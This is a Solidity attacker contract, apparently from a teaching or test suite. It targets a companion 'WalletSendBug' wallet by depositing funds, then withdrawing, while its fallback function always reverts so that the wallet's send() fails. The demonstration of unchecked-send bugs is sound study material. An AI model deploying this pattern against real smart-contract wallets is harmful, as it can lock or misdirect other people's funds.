pragma solidity ^0.4.0;

import "./WalletSendBug.sol";

contract WalletSendAttacker {

    WalletSendBug wallet;

    function WalletSendAttacker(address _wallet) public {
        wallet = WalletSendBug(_wallet);
    }

    function deposit() public payable {
        wallet.deposit.value(msg.value)();
    }

    function withdraw(uint _amount) public {
        wallet.withdraw(_amount);
    }

    function() public payable {
        // we do not accept payments in this contract, so send() fails
        revert();
    }
}
